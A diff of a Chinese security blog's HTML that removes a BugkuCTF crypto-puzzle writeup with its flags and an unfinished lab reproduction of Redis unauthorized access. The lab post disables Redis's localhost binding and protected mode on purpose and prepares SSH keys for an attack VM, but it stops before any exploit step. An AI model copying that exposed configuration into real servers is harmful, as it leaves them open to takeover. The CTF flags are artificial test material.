-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -1407,7 +1823,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-23 15:25:26" itemprop="dateModified" datetime="2019-02-23T15:25:26+08:00">2019-02-23</time>
+                <time title="修改时间：2019-03-01 19:13:08" itemprop="dateModified" datetime="2019-03-01T19:13:08+08:00">2019-03-01</time>
               
             
           </span>
@@ -1424,14 +1840,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -1591,12 +2007,24 @@
                 
               
 
-              <time title="创建时间：2019-02-20 20:13:31 / 修改时间：20:43:29" itemprop="dateCreated datePublished" datetime="2019-02-20T20:13:31+08:00">2019-02-20</time>
+              <time title="创建时间：2019-02-20 20:13:31" itemprop="dateCreated datePublished" datetime="2019-02-20T20:13:31+08:00">2019-02-20</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-01 19:19:31" itemprop="dateModified" datetime="2019-03-01T19:19:31+08:00">2019-03-01</time>
               
             
           </span>
@@ -1613,14 +2041,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -1763,12 +2191,24 @@
                 
               
 
-              <time title="创建时间：2019-02-20 16:14:19 / 修改时间：19:16:21" itemprop="dateCreated datePublished" datetime="2019-02-20T16:14:19+08:00">2019-02-20</time>
+              <time title="创建时间：2019-02-20 16:14:19" itemprop="dateCreated datePublished" datetime="2019-02-20T16:14:19+08:00">2019-02-20</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-01 19:19:41" itemprop="dateModified" datetime="2019-03-01T19:19:41+08:00">2019-03-01</time>
               
             
           </span>
@@ -1785,14 +2225,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -1891,470 +2331,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/19/Crypto/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kawhi">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/kawhi.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kawhi">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/19/Crypto/" class="post-title-link" itemprop="http://yoursite.com/index.html">Crypto</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-02-19 15:24:20" itemprop="dateCreated datePublished" datetime="2019-02-19T15:24:20+08:00">2019-02-19</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-02-20 11:11:08" itemprop="dateModified" datetime="2019-02-20T11:11:08+08:00">2019-02-20</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>推荐一个ctf在线工具的网站：<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a></p>
-<h2 id="滴答-滴"><a href="#滴答-滴" class="headerlink" title="滴答~滴"></a>滴答~滴</h2><ol>
-<li><p>题目<br>-… -.- -.-. - ..-. – .. … -.-.   </p>
-</li>
-<li><p>解析<br>知识点是摩斯密码(Morse Code)，它由两种基本信号和不同的间隔时间组成：短促的点信号“·”，读“滴”（Di）；保持一定时间的长信号“-”，读“嗒”（Da）。间隔时间：滴，1t；嗒，3t；滴嗒间，1t；字符间，3t；字间，7t。<br><br><br>根据时间间隔将该电码分成<code>-...</code>，<code>-.-</code>，<code>-.-.</code>，<code>-</code>，<code>..-.</code>，<code>--</code>，<code>..</code>，<code>...</code>，<code>-.-.</code>九部分，分别是九个字母，对照摩斯密码表可以翻译得 BKCTFMISC ，所以该题答案为<strong>KEY{BKCTFMISC}</strong> 。也可以根据在线的摩斯密码翻译器进行翻译：<a href="https://www.mathsking.net/morse.htm" target="_blank" rel="noopener">https://www.mathsking.net/morse.htm</a>   </p>
-</li>
-</ol>
-<h2 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h2><ol>
-<li><p>题目<br>一只小羊翻过了2个栅栏<br>KYsd3js2E{a2jda}    </p>
-</li>
-<li><p>解析<br>知识点是栅栏密码(Rail-fence Cipher)，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">一般比较常见的是2栏栅栏密码，比如明文：WE YOUNG FOREVER</span><br><span class="line"></span><br><span class="line">#加密</span><br><span class="line">去掉空格：WEYOUNGFOREVER</span><br><span class="line">两个一组得到：WE YO UN GF OR EV ER</span><br><span class="line">先取出每组的第一个字母：WYUGOEE</span><br><span class="line">再取出每组的第二个字母：EONFRVR</span><br><span class="line">连在一起得到密文：WYUGOEEEONFRVR</span><br><span class="line"></span><br><span class="line">#解密</span><br><span class="line">将密文分成两组，变成两行：</span><br><span class="line">W Y U G O E E</span><br><span class="line">E O N F R V R</span><br><span class="line">再将两行的对应字母组合起来：</span><br><span class="line">WEYOUNGFOREVER</span><br><span class="line">分出空格得到明文：</span><br><span class="line">WE YOUNG FOREVER</span><br><span class="line"></span><br><span class="line">N栏栅栏密码就是在分组是分成N组，方法一样。</span><br></pre></td></tr></table></figure>
-<p>根据题目信息该题是一个2栏栅栏密码，用上例方法得到<strong>KEY{sad23jjdsa2}</strong> 。也可以用在线的栅栏密码加解密工具：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
-<h2 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h2><ol>
-<li><p>题目<br><a href="https://ctf.bugku.com/challenges#ok" target="_blank" rel="noopener">https://ctf.bugku.com/challenges#ok</a>   </p>
-</li>
-<li><p>解析<br>打开链接是一堆Ook.Ook!Ook?的东西，这是Brainfuck编码的衍生物，具体可见维基百科：<a href="https://en.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Brainfuck</a><br><br><br>使用在线的Brainfuck/Ook!解码工具：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a><br>解码得到：<strong>flag{ok-ctf-1234-admin}</strong> 。    </p>
-</li>
-</ol>
-<h2 id="这不是摩斯密码"><a href="#这不是摩斯密码" class="headerlink" title="这不是摩斯密码"></a>这不是摩斯密码</h2><ol>
-<li>题目</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>解析<br>该题知识点是Brainfuck编码，这是一种极小化的计算机语言，该语言由八种状态构成。   </li>
-</ol>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">字符</th>
-<th style="text-align:center">含义        </th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">></td>
-<td style="text-align:center">指针加一     </td>
-</tr>
-<tr>
-<td style="text-align:center">&lt;</td>
-<td style="text-align:center">指针减一  </td>
-</tr>
-<tr>
-<td style="text-align:center">+</td>
-<td style="text-align:center">指针指向的字节的值加一</td>
-</tr>
-<tr>
-<td style="text-align:center">-</td>
-<td style="text-align:center">指针指向的字节的值减一</td>
-</tr>
-<tr>
-<td style="text-align:center">.</td>
-<td style="text-align:center">输出指针指向的单元内容（ASCII码）</td>
-</tr>
-<tr>
-<td style="text-align:center">,</td>
-<td style="text-align:center">输入内容到指针指向的单元（ASCⅡ码）</td>
-</tr>
-<tr>
-<td style="text-align:center">[</td>
-<td style="text-align:center">如果指针指向的单元值为零，向后跳转到对应的 <code>]</code> 指令的次一指令处</td>
-</tr>
-<tr>
-<td style="text-align:center">]</td>
-<td style="text-align:center">如果指针指向的单元值不为零，向前跳转到对应的 <code>[</code> 指令的次一指令处</td>
-</tr>
-</tbody>
-</table>
-<p>使用在线的Brainfuck/Ook！工具解码得到<strong>flag{ok-c2tf-3389-admin}</strong> 。   </p>
-<h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h2><ol>
-<li>题目</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111</span><br><span class="line">100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10</span><br><span class="line">11110 101011 1111101</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>解析<br>开始觉得是二进制-ASCII码转换，尝试后发现不对。后来明白这是莫尔斯电码-ASCII码转换，可以自己写一个python脚本。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">string=input()</span><br><span class="line">key=string.split(&quot; &quot;)</span><br><span class="line">dictionary= &#123;&apos;01&apos;: &apos;A&apos;,</span><br><span class="line">        &apos;1000&apos;: &apos;B&apos;,</span><br><span class="line">        &apos;1010&apos;: &apos;C&apos;,</span><br><span class="line">        &apos;100&apos;:&apos;D&apos;,</span><br><span class="line">        &apos;0&apos;:&apos;E&apos;,</span><br><span class="line">        &apos;0010&apos;:&apos;F&apos;,</span><br><span class="line">        &apos;110&apos;: &apos;G&apos;,</span><br><span class="line">        &apos;0000&apos;: &apos;H&apos;,</span><br><span class="line">        &apos;00&apos;: &apos;I&apos;,</span><br><span class="line">        &apos;0111&apos;:&apos;J&apos;,</span><br><span class="line">        &apos;101&apos;: &apos;K&apos;,</span><br><span class="line">        &apos;0100&apos;: &apos;L&apos;,</span><br><span class="line">        &apos;11&apos;: &apos;M&apos;,</span><br><span class="line">        &apos;10&apos;: &apos;N&apos;,</span><br><span class="line">        &apos;111&apos;: &apos;O&apos;,</span><br><span class="line">        &apos;0110&apos;: &apos;P&apos;,</span><br><span class="line">        &apos;1101&apos;: &apos;Q&apos;,</span><br><span class="line">        &apos;010&apos;: &apos;R&apos;,</span><br><span class="line">        &apos;000&apos;: &apos;S&apos;,</span><br><span class="line">        &apos;1&apos;: &apos;T&apos;,</span><br><span class="line">        &apos;001&apos;: &apos;U&apos;,</span><br><span class="line">        &apos;0001&apos;: &apos;V&apos;,</span><br><span class="line">        &apos;011&apos;: &apos;W&apos;,</span><br><span class="line">        &apos;1001&apos;: &apos;X&apos;,</span><br><span class="line">        &apos;1011&apos;: &apos;Y&apos;,</span><br><span class="line">        &apos;1100&apos;: &apos;Z&apos;,</span><br><span class="line">        &apos;01111&apos;: &apos;1&apos;,</span><br><span class="line">        &apos;00111&apos;: &apos;2&apos;,</span><br><span class="line">        &apos;00011&apos;: &apos;3&apos;,</span><br><span class="line">        &apos;00001&apos;: &apos;4&apos;,</span><br><span class="line">        &apos;00000&apos;: &apos;5&apos;,</span><br><span class="line">        &apos;10000&apos;: &apos;6&apos;,</span><br><span class="line">        &apos;11000&apos;: &apos;7&apos;,</span><br><span class="line">        &apos;11100&apos;: &apos;8&apos;,</span><br><span class="line">        &apos;11110&apos;: &apos;9&apos;,</span><br><span class="line">        &apos;11111&apos;: &apos;0&apos;,</span><br><span class="line">        &apos;001100&apos;: &apos;?&apos;,</span><br><span class="line">        &apos;10010&apos;: &apos;/&apos;,</span><br><span class="line">        &apos;101101&apos;: &apos;()&apos;,</span><br><span class="line">        &apos;100001&apos;: &apos;-&apos;,</span><br><span class="line">        &apos;010101&apos;: &apos;.&apos;,</span><br><span class="line">        &apos;110011&apos;:&apos;,&apos;,</span><br><span class="line">        &apos;011010&apos;:&apos;@&apos;,</span><br><span class="line">        &apos;111000&apos;:&apos;:&apos;,</span><br><span class="line">        &apos;101010&apos;:&apos;:&apos;,</span><br><span class="line">        &apos;10001&apos;:&apos;=&apos;,</span><br><span class="line">        &apos;011110&apos;:&quot;&apos;&quot;,</span><br><span class="line">        &apos;101011&apos;:&apos;!&apos;,</span><br><span class="line">        &apos;001101&apos;:&apos;_&apos;,</span><br><span class="line">        &apos;010010&apos;:&apos;&quot;&apos;,</span><br><span class="line">        &apos;10110&apos;:&apos;(&apos;,</span><br><span class="line">        &apos;1111011&apos;:&apos;&#123;&apos;,</span><br><span class="line">        &apos;1111101&apos;:&apos;&#125;&apos;</span><br><span class="line">        &#125;;</span><br><span class="line">for item in key:</span><br><span class="line">    print(dictionary[item],end=&apos;&apos;)</span><br></pre></td></tr></table></figure>
-<p>解密得到 FLAG{M0RSE_CODE_1S_INTEREST1N9!} ，提交后发现不对，应该是要小写，再写一个python脚本转换成小写。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str = input()</span><br><span class="line">print(str.lower())</span><br></pre></td></tr></table></figure>
-<p>得到<strong>flag{m0rse_code_1s_interest1n9!}</strong> 。</p>
-<h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><ol>
-<li><p>题目<br>e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA    </p>
-</li>
-<li><p>解析<br>这题涉及到移位加密算法和base64加密。<br>因为密文结尾是AA，可以联想到base64加密的==，关于base64加密的介绍笔者推荐这篇一篇博客：<br><a href="https://blog.csdn.net/qq_20545367/article/details/79538530" target="_blank" rel="noopener">https://blog.csdn.net/qq_20545367/article/details/79538530</a><br><br><br>此密文是通过移位加密后再base64加密，因此先要移位解密。根据ASCII码对照表可知，A和=对应的十进制数分别是65和61，因此将密文前移4位得到base64密文<br><strong>a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==</strong><br><br><br>再通过base64在线工具解密得到<br><strong>key{68743000650173230e4a58ee153c68e8}</strong><br><br><br>另外也可以通过自己写一些脚本进行解密，比如python脚本，网上的教程也很多。</p>
-</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/18/Redis未授权访问漏洞/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kawhi">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/kawhi.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kawhi">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/18/Redis未授权访问漏洞/" class="post-title-link" itemprop="http://yoursite.com/index.html">Redis未授权访问漏洞</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-02-18 14:37:50" itemprop="dateCreated datePublished" datetime="2019-02-18T14:37:50+08:00">2019-02-18</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-02-19 15:35:01" itemprop="dateModified" datetime="2019-02-19T15:35:01+08:00">2019-02-19</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/漏洞/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="漏洞的重现与利用"><a href="#漏洞的重现与利用" class="headerlink" title="漏洞的重现与利用"></a>漏洞的重现与利用</h2><h3 id="安装并配置redis"><a href="#安装并配置redis" class="headerlink" title="安装并配置redis"></a>安装并配置redis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#从官网下载源码的压缩包</span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br><span class="line"></span><br><span class="line">#解压压缩包</span><br><span class="line">tar xzf redis-3.2.11.tar.gz</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">#进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样可以在终端直接输入redis-server或redis-cli启动服务，不必每次都进入安装目录）</span><br><span class="line">cd src</span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line"></span><br><span class="line">#进入redis-3.2.11目录，将redis.conf拷贝到/etc/目录下</span><br><span class="line">cd ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"></span><br><span class="line">#编辑/etc/redis.conf</span><br><span class="line">vi /etc/redis.conf</span><br><span class="line">bind 127.0.0.1             在这一行前面加上#         </span><br><span class="line">protected-mode yes         这一行将yes改为no</span><br><span class="line"></span><br><span class="line">#启动redis服务</span><br><span class="line">redis-server /etc/redis.conf &amp;</span><br><span class="line"></span><br><span class="line">#安装ssh服务</span><br><span class="line">systemctl start sshd</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞重现"><a href="#漏洞重现" class="headerlink" title="漏洞重现"></a>漏洞重现</h3><ol>
-<li><p>首先打开两个虚拟机（都要配置reids），笔者设定了攻击端虚拟机为kawhi，被攻击端虚拟机为bob。<strong>网络都设置为 桥接网卡，界面名称为 Realtek PCIe GBE Family Controller，混杂模式为 全部允许</strong>。（重要）    </p>
-</li>
-<li><p>然后使用<code>ifconfig</code>命令查看两台虚拟机的ip，发现ip均为    <strong>192.168.137.101</strong>    </p>
-</li>
-<li><p>修改攻击端（kawhi）ip为 <strong>192.168.137.102</strong><br><code>ifconfig enp0s3 192.168.137.102 up</code>    </p>
-</li>
-<li><p>在bob中开启redis服务<br><code>redis-server /etc/redis.conf &amp;</code>    </p>
-</li>
-<li><p>在kawhi中生成ssh公钥和私钥，密码设置为空<br><img src="https://kawhi123.github.io/images/ssh.png" alt="">    </p>
-</li>
-<li><p>进入.ssh目录，将公钥保存到1.txt<br><img src="https://kawhi123.github.io/images/1.txt.png" alt="">    </p>
-</li>
-</ol>
-<p>7.</p>
-<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="ping目标主机（bob）ip出现错误：connect-Network-is-unreachable"><a href="#ping目标主机（bob）ip出现错误：connect-Network-is-unreachable" class="headerlink" title="ping目标主机（bob）ip出现错误：connect: Network is unreachable"></a>ping目标主机（bob）ip出现错误：connect: Network is unreachable</h3><ol>
-<li>查看宿主机的网卡信息<br>依次进入<strong>控制面板&gt;网络和Internet&gt;网络和共享中心&gt;以太网&gt;详细信息</strong>，即可查看。<br>146</li>
-<li>配置虚拟机的网卡信息    </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#修改网卡配置内容（bob）</span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-enp0s3</span><br><span class="line"></span><br><span class="line">#添加文件内容</span><br><span class="line">IPADDR=169.254.199.101        //虚拟机的ip地址应设置成和宿主机在同一网段</span><br><span class="line">NETMASK=255.255.0.0</span><br><span class="line">GATEWAY=169.254.199.44          //虚拟机上的网关就是宿主机上的ip地址</span><br><span class="line"></span><br><span class="line">#同理修改kawhi网卡配置</span><br><span class="line">IPADDR=169.254.199.102         //ip地址和bob不同</span><br><span class="line">NETMASK=255.255.0.0</span><br><span class="line">GATEWAY=169.254.199.44</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>网络重连<br>service network restart</li>
-</ol>
-<h3 id="VB设置桥接网卡无法联网"><a href="#VB设置桥接网卡无法联网" class="headerlink" title="VB设置桥接网卡无法联网"></a>VB设置桥接网卡无法联网</h3><ol>
-<li>安装虚拟网卡<br><a href="https://blog.csdn.net/eddjh_31/article/details/82694205" target="_blank" rel="noopener">https://blog.csdn.net/eddjh_31/article/details/82694205</a></li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
